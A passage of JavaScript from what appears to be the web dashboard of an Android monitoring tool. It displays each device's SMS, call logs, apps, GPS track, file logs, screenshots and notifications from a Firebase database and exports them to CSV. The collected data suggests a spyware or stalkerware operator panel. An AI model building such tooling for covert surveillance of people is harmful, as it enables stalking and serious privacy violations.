                    exportData[item.label] = (typeof item.value === 'string' && item.value.includes('<span')) ? (isOnline ? 'Online' : 'Offline') : item.value;
                });
                html += '</div>';
                container.innerHTML = html;
                currentDeviceDataCache.overview = [exportData]; 

                if (document.getElementById('save-alias-btn')) {
                    document.getElementById('save-alias-btn').addEventListener('click', async () => {
                        const newAlias = document.getElementById('editable-alias-input').value;
                        if (newAlias.trim() === "") { alert("Alias cannot be empty."); return; }
                        showLoading();
                        try {
                            await update(ref(db, `devices/${currentDeviceUid}/info`), { alias: newAlias });
                            alert('Alias updated successfully!');
                        } catch (error) {
                            console.error("Error updating alias:", error);
                            alert('Failed to update alias.');
                        } finally {
                            showLoading(false);
                        }
                    });
                }
            }, 'overview'); 
        };

        const loadSmsData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/sms`;
            listenToDbPath(path, (data) => {
                const smsArray = data ? Object.values(data) : [];
                currentDeviceDataCache.sms = smsArray; 
                const headers = [
                    { key: 'address', label: 'Address' }, { key: 'body', label: 'Body', wrap: true },
                    { key: 'date', label: 'Date', formatter: formatTimestamp },
                    { key: 'type', label: 'Type', formatter: (type) => type === 1 ? 'Inbox' : (type === 2 ? 'Sent' : 'Unknown') }
                ];
                document.getElementById('messages-data').innerHTML = createTable(smsArray.reverse(), headers, 'messages'); 
            }, 'messages');
        };

        const loadCallLogsData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/calls`;
            listenToDbPath(path, (data) => {
                const callsArray = data ? Object.values(data) : [];
                currentDeviceDataCache.calls = callsArray;
                const headers = [
                    { key: 'number', label: 'Number' }, { key: 'name', label: 'Contact Name' },
                    { key: 'duration', label: 'Duration (s)' }, { key: 'date', label: 'Date', formatter: formatTimestamp },
                    { key: 'type', label: 'Type', formatter: (type) => {
                        const types = {1: 'Incoming', 2: 'Outgoing', 3: 'Missed', 4: 'Voicemail', 5: 'Rejected', 6: 'Blocked'};
                        return types[type] || 'Unknown';
                    }}
                ];
                document.getElementById('calls-data').innerHTML = createTable(callsArray.reverse(), headers, 'call logs');
            }, 'calls');
        };

        const loadAppsData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/apps`;
            listenToDbPath(path, (data) => {
                const appsArray = data ? Object.values(data) : [];
                currentDeviceDataCache.apps = appsArray;
                const headers = [
                    { key: 'appName', label: 'App Name' }, { key: 'packageName', label: 'Package Name', wrap: true },
                    { key: 'versionName', label: 'Version' }, { key: 'installTime', label: 'Installed', formatter: formatTimestamp },
                    { key: 'lastUpdateTime', label: 'Updated', formatter: formatTimestamp }
                ];
                document.getElementById('apps-data').innerHTML = createTable(appsArray, headers, 'installed apps');
            }, 'apps');
        };

        const loadBatteryData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/battery`;
            listenToDbPath(path, (data) => {
                displayKeyValuePairs(data, 'battery-data', 'battery info');
            }, 'battery');
        };

        const loadGpsData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/gps`;
            const mapContainer = document.getElementById('gps-map');
            const historyContainer = document.getElementById('gps-history-data');
            mapContainer.classList.remove('loading-map'); 

            if (!map && L) {
                map = L.map(mapContainer).setView([0, 0], 2); 
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                }).addTo(map);
            } else if (map) { 
                 map.eachLayer(layer => { if (!!layer.toGeoJSON) map.removeLayer(layer); });
            }

            listenToDbPath(path, (data) => {
                const gpsArray = data ? Object.values(data).sort((a,b) => b.timestamp - a.timestamp) : []; 
                currentDeviceDataCache.gps = gpsArray;
                mapContainer.classList.remove('loading-map'); 

                if (gpsArray.length > 0 && map) {
                    const latest = gpsArray[0];
                    if (latest.latitude && latest.longitude) {
                        if (mapContainer.querySelector('p.text-muted')) mapContainer.innerHTML = '';
                        if (!document.getElementById('gps-map')._leaflet_id) { 
                            map = L.map(mapContainer).setView([0, 0], 2);
                             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(map);
                        }
                        const latLng = [latest.latitude, latest.longitude];
                        map.setView(latLng, 15);
                        L.marker(latLng).addTo(map)
                            .bindPopup(`<b>Location</b><br>Lat: ${latest.latitude}<br>Lon: ${latest.longitude}<br>Time: ${formatTimestamp(latest.timestamp)}<br>Accuracy: ${latest.accuracy || 'N/A'}m`)
                            .openPopup();
                    } else { 
                         mapContainer.innerHTML = '<p class="text-muted p-3">Latest GPS data is incomplete or invalid.</p>';
                         if(map) map.setView([0,0],2); 
                    }
                } else if (currentDeviceUid && map) { 
                     mapContainer.innerHTML = '<p class="text-muted p-3">No GPS data found for this device.</p>';
                     map.setView([0, 0], 2); 
                } else if (!currentDeviceUid && map) { 
                     mapContainer.innerHTML = '<p class="text-muted p-3">Please select a device to view location on map.</p>';
                     map.setView([0, 0], 2);
                }
                
                const headers = [
                    { key: 'latitude', label: 'Latitude' }, { key: 'longitude', label: 'Longitude' },
                    { key: 'accuracy', label: 'Accuracy (m)' }, { key: 'speed', label: 'Speed (m/s)' },
                    { key: 'timestamp', label: 'Timestamp', formatter: formatTimestamp }
                ];
                historyContainer.innerHTML = createTable(gpsArray, headers, 'GPS history');
            }, 'gps');
        };

        const loadFilesData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/files`;
            listenToDbPath(path, (data) => {
                const filesArray = data ? Object.values(data) : [];
                currentDeviceDataCache.files = filesArray;
                const headers = [
                    { key: 'path', label: 'Path', wrap: true }, { key: 'name', label: 'Name' },
                    { key: 'size', label: 'Size (Bytes)' }, { key: 'lastModified', label: 'Last Modified', formatter: formatTimestamp },
                    { key: 'type', label: 'Type (action)' } 
                ];
                document.getElementById('files-data').innerHTML = createTable(filesArray, headers, 'file logs');
            }, 'files');
        };

        const loadScreenshotsData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/screenshots`;
            listenToDbPath(path, (data) => {
                const screenshotsArray = data ? Object.values(data) : [];
                currentDeviceDataCache.screenshots = screenshotsArray; 
                const container = document.getElementById('screenshots-data');
                
                if (!currentDeviceUid) { 
                     container.innerHTML = '<p class="text-muted">Please select a device to view screenshots.</p>'; return;
                }
                if (screenshotsArray.length === 0) {
                    container.innerHTML = '<p class="text-muted">No screenshots found for this device.</p>';
                    return;
                }
                let html = '';
                screenshotsArray.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

                screenshotsArray.forEach(ss => {
                    if (ss.url) { 
                        html += `<div class="screenshot-item">
                                    <a href="${sanitizeHTML(ss.url)}" target="_blank" title="View full size. Captured: ${formatTimestamp(ss.timestamp)}">
                                        <img src="${sanitizeHTML(ss.url)}" alt="Screenshot" loading="lazy">
                                    </a>
                                    <p class="small text-muted text-center">${formatTimestamp(ss.timestamp)}</p>
                                 </div>`;
                    }
                });
                container.innerHTML = html || '<p class="text-muted">No valid screenshot URLs found for this device.</p>'; 
            }, 'screenshots');
        };

        const loadNotificationsData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/notifications`;
            listenToDbPath(path, (data) => {
                const notificationsArray = data ? Object.values(data) : [];
                currentDeviceDataCache.notifications = notificationsArray;
                const headers = [
                    { key: 'appName', label: 'App Name' }, { key: 'title', label: 'Title', wrap: true },
                    { key: 'text', label: 'Text', wrap: true }, { key: 'postTime', label: 'Post Time', formatter: formatTimestamp }
                ];
                document.getElementById('notifications-data').innerHTML = createTable(notificationsArray.reverse(), headers, 'notifications');
            }, 'notifications');
        };
        
        const loadDeviceInfoData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/info`; 
            listenToDbPath(path, (data) => {
                displayKeyValuePairs(data, 'device-info-data', 'device info');
            }, 'deviceInfo'); 
        };

        const exportToCsv = (filename, rows) => {
            if (!rows || rows.length === 0) {
                alert("No data to export.");
                return;
            }
            const processRow = (row) => {
                let finalVal = '';
                for (let j = 0; j < row.length; j++) {
                    let innerValue = row[j] === null || row[j] === undefined ? '' : String(row[j]);
                    if (String(row[j]).includes('"')) {
                        innerValue = innerValue.replace(/"/g, '""');
                    }
                    if (j > 0) finalVal += ',';
                    finalVal += `"${innerValue}"`;
                }
                return finalVal + '\r\n';
            };

            let csvFile = '';
            const headers = Object.keys(rows[0]);
            csvFile += processRow(headers);

            for (let i = 0; i < rows.length; i++) {
                const rowValues = headers.map(header => rows[i][header]);
                csvFile += processRow(rowValues);
            }

            const blob = new Blob([csvFile], { type: 'text/csv;charset=utf-8;' });
            const link = document.createElement("a");
            if (link.download !== undefined) {
                const url = URL.createObjectURL(blob);
                link.setAttribute("href", url);
                link.setAttribute("download", filename);
                link.style.visibility = 'hidden';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }
        };

        document.querySelectorAll('.btn-export').forEach(button => {
            button.addEventListener('click', () => {
                if (!currentDeviceUid) { 
                    alert("Please select a device first before exporting.");
                    return;
                }
                const section = button.getAttribute('data-section');
                const dataToExport = currentDeviceDataCache[section];

                if (dataToExport && dataToExport.length > 0) {
                    let cleanedData = dataToExport; 
                     if (['overview', 'battery', 'info'].includes(section) && dataToExport.length === 1 && typeof dataToExport[0] === 'object') {
                         cleanedData = [{}]; 
                         for(const key in dataToExport[0]) {
                            cleanedData[0][key.replace(/<[^>]*>/g, "")] = String(dataToExport[0][key]).replace(/<[^>]*>/g, "");
                         }
                    } else if (section === 'screenshots') { 
                        cleanedData = dataToExport.map(s => ({ url: s.url, timestamp: formatTimestamp(s.timestamp) }));
                    } else if (Array.isArray(dataToExport)) { 
                         cleanedData = dataToExport.map(item => {
                            const newItem = { ...item }; 
                            if (newItem.date) newItem.date = formatTimestamp(newItem.date);
                            if (newItem.type && section === 'sms') newItem.type = newItem.type === 1 ? 'Inbox' : (newItem.type === 2 ? 'Sent' : 'Unknown');
                            if (newItem.type && section === 'calls') {
                                const types = {1: 'Incoming', 2: 'Outgoing', 3: 'Missed', 4: 'Voicemail', 5: 'Rejected', 6: 'Blocked'};
                                newItem.type = types[newItem.type] || 'Unknown';
                            }
                            if (newItem.installTime) newItem.installTime = formatTimestamp(newItem.installTime);
                            if (newItem.lastUpdateTime) newItem.lastUpdateTime = formatTimestamp(newItem.lastUpdateTime);
                            if (newItem.timestamp && (section === 'gps' || section === 'files' || section === 'screenshots')) newItem.timestamp = formatTimestamp(newItem.timestamp);
                            if (newItem.lastModified) newItem.lastModified = formatTimestamp(newItem.lastModified); 
                            if (newItem.postTime) newItem.postTime = formatTimestamp(newItem.postTime); 
                            return newItem;
                        });
                    }
                    exportToCsv(`${currentDeviceUid}_${section}_export.csv`, cleanedData);
                } else {
                    alert(`No data available to export for ${section}.`);
                }
            });
        });

        showLoading();
    </script>
</body>
</html>